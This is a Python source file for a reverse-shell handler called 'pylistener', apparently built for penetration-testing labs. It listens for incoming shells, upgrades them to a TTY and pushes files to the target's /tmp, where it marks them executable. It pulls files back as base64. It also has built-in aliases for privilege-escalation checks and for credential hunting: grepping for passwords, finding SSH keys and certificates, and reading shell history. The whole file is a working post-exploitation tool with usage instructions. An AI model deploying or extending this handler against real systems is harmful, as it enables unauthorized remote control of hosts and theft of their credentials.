##############################################
## Freeworld - Allergic to aluminum baby   ##
## How to use:                             ##
##   Add file to PATH                      ##
##   pylistener <PORT>                     ##
##############################################

#!/usr/bin/env python3
import socket
import threading
import os
import sys

HOST = "0.0.0.0"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

TTY_UPGRADE = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"

ALIASES = {
    # Privilege escalation checks
    "privesc": "sudo -l; id; whoami; uname -a",
    "suid": "find / -perm -u=s -type f 2>/dev/null",
    "guid": "find / -perm -g=s -type f 2>/dev/null",
    "world": "find / -writable -type f 2>/dev/null | grep -v proc",
    "worlddir": "find / -writable -type d 2>/dev/null | grep -v proc",
    "crons": "cat /etc/crontab; ls -la /etc/cron*",
    "caps": "getcap -r / 2>/dev/null",

    # System enumeration
    "sysinfo": "uname -a; cat /etc/os-release; hostname; id",
    "users": "cat /etc/passwd | grep -v nologin | grep -v false",
    "groups": "cat /etc/group",
    "network": "ifconfig; ip a; netstat -tulpn 2>/dev/null",
    "procs": "ps aux",
    "services": "systemctl list-units --type=service 2>/dev/null",

    # Credential hunting
    "passhunt": "grep -ri 'password' /home /var/www /opt 2>/dev/null",
    "keyhunt": "find / -name '*.key' -o -name '*.pem' -o -name 'id_rsa' 2>/dev/null",
    "confhunt": "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | grep -v proc",
    "history": "cat ~/.bash_history; cat ~/.zsh_history 2>/dev/null",

    # File system checks
    "loot": "ls -la /home; ls -la /root 2>/dev/null; ls -la /var/www 2>/dev/null",
    "proof": "find / -name 'proof.txt' -o -name 'local.txt' 2>/dev/null",
    "interesting": "find / -name '*.txt' -o -name '*.bak' -o -name '*.old' 2>/dev/null | grep -v proc",

    # Network checks
    "arp": "arp -a; cat /etc/hosts",
    "ports": "ss -tulpn 2>/dev/null || netstat -tulpn",
    "routes": "route -n; ip route",
}

def print_help():
    print("\n[*] Built in aliases:")
    print("\n  PRIVESC:")
    print("    privesc    — sudo, id, whoami, uname")
    print("    suid       — find SUID binaries")
    print("    guid       — find GUID binaries")
    print("    world      — find world writable files")
    print("    worlddir   — find world writable directories")
    print("    crons      — check cron jobs")
    print("    caps       — check capabilities")
    print("\n  SYSTEM ENUM:")
    print("    sysinfo    — OS and hostname info")
    print("    users      — list users")
    print("    groups     — list groups")
    print("    network    — network interfaces")
    print("    procs      — running processes")
    print("    services   — running services")
    print("\n  CREDENTIAL HUNTING:")
    print("    passhunt   — search for passwords in files")
    print("    keyhunt    — find SSH keys and certs")
    print("    confhunt   — find config files")
    print("    history    — check shell history")
    print("\n  FILE SYSTEM:")
    print("    loot       — check home and web dirs")
    print("    proof      — find proof.txt / local.txt")
    print("    interesting— find txt, bak, old files")
    print("\n  NETWORK:")
    print("    arp        — ARP table and hosts file")
    print("    ports      — listening ports")
    print("    routes     — routing table")
    print("\n  HANDLER:")
    print("    upload <file>   — upload file to /tmp/")
    print("    download <file> — download file from target")
    print("    background      — background this session")
    print("    help            — show this menu\n")

def handle_shell(conn, addr):
    print(f"\n{'='*50}")
    print(f"[+] Incoming connection!")
    print(f"[+] Remote IP   : {addr[0]}")
    print(f"[+] Remote Port : {addr[1]}")
    print(f"[+] Successfully connected from {addr[0]}:{addr[1]}")
    print(f"{'='*50}\n")

    print("[*] Upgrading to TTY...")
    conn.send(TTY_UPGRADE.encode())

    def receiver():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode(errors="ignore"), end="", flush=True)
            except:
                break

    t = threading.Thread(target=receiver, daemon=True)
    t.start()

    print("[*] Shell ready — type 'help' for built in commands\n")

    while True:
        try:
            cmd = input()

            # Help menu
            if cmd == "help":
                print_help()

            # Upload file
            elif cmd.startswith("upload "):
                filepath = cmd.split(" ", 1)[1].strip()

                if os.path.exists(filepath):
                    filename = os.path.basename(filepath)
                    with open(filepath, "rb") as f:
                        data = f.read()
                    b64 = __import__("base64").b64encode(data).decode()
                    upload_cmd = f"echo {b64} | base64 -d > /tmp/{filename} && chmod +x /tmp/{filename}\n"
                    conn.send(upload_cmd.encode())
                    print(f"[+] Uploaded {filepath} to /tmp/{filename}")
                else:
                    print(f"[-] File not found: {filepath}")
                    print(f"[-] Current directory: {os.getcwd()}")
                    print(f"[-] Try using full path: upload /tmp/{os.path.basename(filepath)}")

            # Download file
            elif cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1].strip()
                dl_cmd = f"base64 {filename}\n"
                conn.send(dl_cmd.encode())
                print(f"[*] Copy base64 output and run:")
                print(f"    echo <output> | base64 -d > {os.path.basename(filename)}")

            # Background session
            elif cmd == "background":
                print("[*] Shell backgrounded")
                break

            # Check aliases
            elif cmd in ALIASES:
                print(f"[*] Running: {ALIASES[cmd]}")
                conn.send((ALIASES[cmd] + "\n").encode())

            # Regular command
            else:
                conn.send((cmd + "\n").encode())

        except KeyboardInterrupt:
            print("\n[*] Backgrounding shell")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            break

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"\n{'='*50}")
    print(f"[*] Custom Shell Handler")
    print(f"[*] Listening on {HOST}:{PORT}")
    print(f"[*] Waiting for incoming connections...")
    print(f"{'='*50}\n")

    while True:
        try:
            conn, addr = server.accept()
            thread = threading.Thread(
                target=handle_shell,
                args=(conn, addr),
                daemon=True
            )
            thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down")
            break

if __name__ == "__main__":
    main()
